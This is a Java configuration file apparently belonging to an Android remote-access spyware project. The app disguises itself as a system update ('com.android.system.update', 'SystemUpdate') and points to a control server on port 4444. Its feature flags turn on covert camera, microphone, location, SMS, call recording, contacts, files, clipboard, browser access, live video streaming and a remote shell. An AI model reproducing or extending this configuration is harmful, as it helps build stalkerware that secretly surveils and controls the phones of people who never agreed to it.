package com.android.system.update;

// THIS FILE WILL BE OVERWRITTEN BY YOUR FLUTTER APP
public class Config {
    // Connection settings
    public static final String SERVER_HOST = "127.0.0.1";
    public static final int SERVER_PORT = 4444;
    
    // App identity
    public static final String APP_NAME = "SystemUpdate";
    public static final String PACKAGE_NAME = "com.android.system.update";
    public static final String VERSION = "1.0.0";
    
    // Feature flags (all true by default for testing)
    public static final boolean ENABLE_CAMERA = true;
    public static final boolean ENABLE_MICROPHONE = true;
    public static final boolean ENABLE_LOCATION = true;
    public static final boolean ENABLE_SMS = true;
    public static final boolean ENABLE_CALLS = true;
    public static final boolean ENABLE_CONTACTS = true;
    public static final boolean ENABLE_FILES = true;
    public static final boolean ENABLE_SHELL = true;
    public static final boolean ENABLE_APP_MANAGER = true;
    public static final boolean ENABLE_CLIPBOARD = true;
    public static final boolean ENABLE_CALL_RECORDING = true;
    public static final boolean ENABLE_BROWSER = true;
    public static final boolean ENABLE_VIDEO_STREAM = true;
    // NEW: Video streaming module flag
    public static final boolean ENABLE_VIDEO = true;
    
    // Video streaming settings
    public static final int VIDEO_WIDTH = 640;
    public static final int VIDEO_HEIGHT = 480;
    public static final int VIDEO_BITRATE = 500000; // 500 kbps
    public static final int VIDEO_FPS = 15;
    public static final int VIDEO_KEYFRAME_INTERVAL = 2; // seconds
}
